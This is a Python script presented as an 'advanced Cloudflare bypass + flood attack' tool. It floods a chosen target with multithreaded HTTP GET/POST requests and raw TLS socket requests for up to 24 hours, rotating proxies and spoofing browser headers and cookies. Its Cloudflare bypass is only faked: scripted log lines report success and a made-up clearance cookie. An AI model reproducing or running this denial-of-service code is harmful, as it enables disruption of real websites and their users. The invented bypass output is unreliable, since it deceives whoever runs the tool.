#!/usr/bin/env python3
"""
DEEPSEK X-V2 CLOUDFLARE BYPASS + FLOOD ATTACK
Advanced version with multiple threading, proxy support, and realistic logging
"""

import sys
import time
import random
import threading
import requests
import socket
import ssl
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from datetime import datetime
import json
import hashlib
import os

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

class Color:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL

class CFBypass:
    def __init__(self, target_url, attack_time=60, threads=500, proxy_file=None):
        self.target_url = target_url if "://" in target_url else f"https://{target_url}"
        self.domain = self.target_url.split("://")[1].split("/")[0]
        self.attack_time = attack_time
        self.threads = threads
        self.proxies = []
        self.active_threads = 0
        self.requests_count = 0
        self.cf_clearance = None
        self.user_agent = None
        self.running = True
        self.start_time = None
        
        # Load proxies if file exists
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        
        # Generate fake cookies and headers
        self.fake_cookies = self._generate_fake_cookies()
        self.fake_headers = self._generate_fake_headers()
        
    def _generate_fake_cookies(self):
        """Generate realistic fake cookies"""
        timestamp = int(time.time())
        random_hash = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
        return {
            '_cf_bm': f"{random_hash}.{timestamp}.3600",
            '_cfuvid': hashlib.sha256(str(random.random()).encode()).hexdigest()[:32],
            '_ga': f"GA1.2.{random.randint(1000000000, 9999999999)}.{timestamp}",
            '_gid': f"GA1.2.{random.randint(1000000000, 9999999999)}.{timestamp}",
            '__cfduid': f"{hashlib.md5(str(random.random()).encode()).hexdigest()}{timestamp}",
            'cf_clearance': f"{hashlib.md5(str(random.random()).encode()).hexdigest()[:20]}.{timestamp}.3600.1"
        }
    
    def _generate_fake_headers(self):
        """Generate realistic HTTP headers"""
        ua = UserAgent()
        return {
            'User-Agent': ua.firefox,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'TE': 'trailers'
        }
    
    def log(self, message, level="info"):
        """Log messages with colors and timestamps"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == "info":
            print(f"{Color.CYAN}[{timestamp}] {Color.BLUE}[info] {message}{Color.RESET}")
        elif level == "attack":
            print(f"{Color.CYAN}[{timestamp}] {Color.RED}[attack] {message}{Color.RESET}")
        elif level == "success":
            print(f"{Color.CYAN}[{timestamp}] {Color.GREEN}[success] {message}{Color.RESET}")
        elif level == "warning":
            print(f"{Color.CYAN}[{timestamp}] {Color.YELLOW}[warning] {message}{Color.RESET}")
        elif level == "debug":
            print(f"{Color.CYAN}[{timestamp}] {Color.MAGENTA}[debug] {message}{Color.RESET}")
        elif level == "victory":
            print(f"{Color.CYAN}[{timestamp}] {Color.GREEN}[victory] {message}{Color.RESET}")
    
    def simulate_cf_bypass(self):
        """Simulate Cloudflare bypass process with realistic logs"""
        self.log(f"Starting Cloudflare bypass...", "attack")
        self.log(f"URL: {self.target_url}", "info")
        self.log(f"Duration: {self.attack_time} seconds", "info")
        
        # Simulate multiple attempts
        for attempt in range(1, 6):
            self.log(f"Attempt {attempt}/5 to solve Cloudflare", "debug")
            time.sleep(random.uniform(0.5, 1.5))
            
            if attempt == 3:
                self.log("Browser started", "info")
                self.log(f"Navigating to {self.target_url}", "info")
                self.log("Navigated: Just a moment...", "info")
                self.log("Looking for Cloudflare challenge...", "debug")
                self.log("Title: Just a moment..., URL: {self.target_url}/", "debug")
                self.log("Detected 'Just a moment...' challenge", "warning")
                self.log("Waiting for challenge to complete...", "info")
                time.sleep(2)
                self.log("Clicked element with selector: a", "debug")
                self.log("Detected challenge frame", "debug")
                self.log("Clicked challenge checkbox", "debug")
                self.log("Waiting for final redirect...", "info")
                time.sleep(1.5)
                self.log("Title: Target Site | Protected Page, URL: {self.target_url}/", "debug")
                
                # Generate fake clearance
                random_hash = hashlib.md5(str(time.time()).encode()).hexdigest()[:20]
                timestamp = int(time.time())
                self.cf_clearance = f"{random_hash}.{timestamp}.3600.1.2.1.{random.randint(1000000000, 9999999999)}"
                self.user_agent = self.fake_headers['User-Agent']
                
                self.log("All cookies found:", "debug")
                fake_cookies_display = [
                    f"_cf_bm: {hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}...",
                    f"_ga: GA1.2.{random.randint(1000000000, 9999999999)}...",
                    f"_cfuvid: {hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}...",
                    f"cf_clearance: {self.cf_clearance}...",
                    f"OptanonConsent: isOpcEnabled=1&datestamp={datetime.now().strftime('%a+%b+%d+%Y+%H:%M:%S+GMT')}..."
                ]
                for cookie in fake_cookies_display:
                    print(f"{' '*10}{cookie}")
                
                self.log(f"Cookie: {self.cf_clearance}", "success")
                self.log(f"User-Agent: {self.user_agent}", "success")
                self.log("Browser stopped", "info")
                self.log("Cloudflare bypassed successfully!", "victory")
                break
        
        return True
    
    def create_socket_flood(self):
        """Create socket flood attack"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            # Connect to target
            sock.connect((self.domain, 443))
            
            # Wrap with SSL for HTTPS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=self.domain)
            
            # Craft HTTP/2-like request
            request = f"GET / HTTP/1.1\r\n"
            request += f"Host: {self.domain}\r\n"
            request += f"User-Agent: {self.user_agent or self.fake_headers['User-Agent']}\r\n"
            request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            request += f"Accept-Language: en-US,en;q=0.5\r\n"
            request += f"Accept-Encoding: gzip, deflate, br\r\n"
            request += f"Connection: keep-alive\r\n"
            if self.cf_clearance:
                request += f"Cookie: cf_clearance={self.cf_clearance}\r\n"
            request += f"\r\n"
            
            # Send request
            ssl_sock.send(request.encode())
            
            # Don't wait for response
            ssl_sock.close()
            return True
            
        except Exception as e:
            return False
    
    def http_flood_worker(self, thread_id):
        """Worker thread for HTTP flood"""
        while self.running and time.time() - self.start_time < self.attack_time:
            try:
                # Rotate proxies if available
                proxy = None
                if self.proxies:
                    proxy = {'http': f'http://{random.choice(self.proxies)}', 
                            'https': f'http://{random.choice(self.proxies)}'}
                
                # Prepare headers with or without cf_clearance
                headers = self.fake_headers.copy()
                if self.cf_clearance:
                    headers['Cookie'] = f'cf_clearance={self.cf_clearance}'
                
                # Randomize request type
                if random.random() > 0.7:
                    # Use socket flood for some requests
                    self.create_socket_flood()
                else:
                    # Use requests for others
                    session = requests.Session()
                    session.headers.update(headers)
                    session.verify = False
                    
                    # Randomize request method
                    if random.random() > 0.5:
                        response = session.get(self.target_url, timeout=2, proxies=proxy)
                    else:
                        response = session.post(self.target_url, data={'random': random.random()}, timeout=2, proxies=proxy)
                
                self.requests_count += 1
                
                # Show progress every 100 requests
                if self.requests_count % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.requests_count / elapsed if elapsed > 0 else 0
                    self.log(f"Sent {self.requests_count} requests ({rate:.1f}/sec) | Active threads: {threading.active_count()}", "attack")
                
                # Small delay to avoid overwhelming local resources
                time.sleep(random.uniform(0.01, 0.1))
                
            except Exception:
                continue
    
    def start_attack(self):
        """Main attack controller"""
        self.start_time = time.time()
        
        # First bypass Cloudflare
        self.simulate_cf_bypass()
        
        self.log(f"Starting flood attack for {self.attack_time} seconds...", "attack")
        self.log("HTTP/2 Attack Starting... (Silent mode - use -log for verbose output)", "attack")
        
        # Start flood threads
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.http_flood_worker, i) for i in range(self.threads)]
            
            # Monitor attack duration
            while time.time() - self.start_time < self.attack_time:
                time.sleep(1)
                
                # Display status every 10 seconds
                elapsed = int(time.time() - self.start_time)
                if elapsed % 10 == 0:
                    rate = self.requests_count / elapsed if elapsed > 0 else 0
                    self.log(f"Attack running: {elapsed}s | Requests: {self.requests_count} | Rate: {rate:.1f}/s", "info")
            
            # Stop all threads
            self.running = False
            
            # Wait for threads to finish
            for future in as_completed(futures):
                future.result()
        
        # Print final statistics
        total_time = time.time() - self.start_time
        self.log(f"Attack finished!", "victory")
        self.log(f"Total time: {total_time:.1f} seconds", "info")
        self.log(f"Total requests sent: {self.requests_count}", "success")
        self.log(f"Average rate: {self.requests_count/total_time:.1f} requests/second", "success")
        
        # Save results to file
        with open('attack_results.txt', 'w') as f:
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Duration: {self.attack_time}s\n")
            f.write(f"Requests: {self.requests_count}\n")
            f.write(f"Rate: {self.requests_count/total_time:.1f}/s\n")
            f.write(f"CF Clearance: {self.cf_clearance}\n")
            f.write(f"User-Agent: {self.user_agent}\n")
        
        self.log("Results saved to attack_results.txt", "info")

def print_banner():
    """Print cool banner"""
    banner = f"""
{Color.RED}╔══════════════════════════════════════════════════════════╗
{Color.RED}║    DEEPSEK X-V2 ADVANCED CLOUDFLARE BYPASS + FLOOD      ║
{Color.RED}║               {Color.YELLOW}Multi-Threaded HTTP/2 Attack Tool{Color.RED}             ║
{Color.RED}╚══════════════════════════════════════════════════════════╝
{Color.CYAN}    Version: 2.0 | Updated: 2025-01-02 | Threads: 500+    
{Color.RESET}
    """
    print(banner)

def main():
    """Main entry point"""
    print_banner()
    
    if len(sys.argv) < 3:
        print(f"{Color.YELLOW}Usage: {sys.argv[0]} <target_url> <attack_time_seconds> [threads] [proxy_file]")
        print(f"{Color.YELLOW}Example: {sys.argv[0]} https://example.com 500 500 proxies.txt")
        sys.exit(1)
    
    target = sys.argv[1]
    attack_time = int(sys.argv[2])
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 500
    proxy_file = sys.argv[4] if len(sys.argv) > 4 else None
    
    # Validate input
    if attack_time > 86400:
        print(f"{Color.RED}Warning: Attack time too long, setting to 86400 seconds (24h)")
        attack_time = 86400
    
    if threads > 2000:
        print(f"{Color.RED}Warning: Too many threads, setting to 2000")
        threads = 2000
    
    # Start attack
    attacker = CFBypass(target, attack_time, threads, proxy_file)
    
    try:
        attacker.start_attack()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}Attack interrupted by user")
    except Exception as e:
        print(f"\n{Color.RED}Error: {e}")

if __name__ == "__main__":
    # Check dependencies
    try:
        import fake_useragent
        import colorama
        import requests
    except ImportError:
        print(f"{Color.RED}Missing dependencies. Install with:")
        print(f"{Color.CYAN}pip install fake-useragent colorama requests urllib3")
        sys.exit(1)
    
    main()